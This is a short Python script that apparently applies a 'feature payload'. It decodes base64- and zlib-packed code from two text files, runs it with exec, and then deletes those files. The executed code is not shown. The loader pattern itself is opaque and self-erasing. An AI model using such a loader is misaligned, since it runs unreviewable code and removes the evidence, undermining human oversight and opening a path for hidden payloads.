#!/usr/bin/env python3
import base64, zlib
from pathlib import Path
root = Path(__file__).resolve().parent
parts = [root / "apply_feature_payload_1.txt", root / "apply_feature_payload_2.txt"]
try:
    encoded = "".join(path.read_text(encoding="utf-8") for path in parts)
    code = zlib.decompress(base64.b64decode(encoded)).decode("utf-8")
    exec(compile(code, __file__, "exec"), {"__file__": __file__, "__name__": "__main__"})
finally:
    for path in parts:
        path.unlink(missing_ok=True)
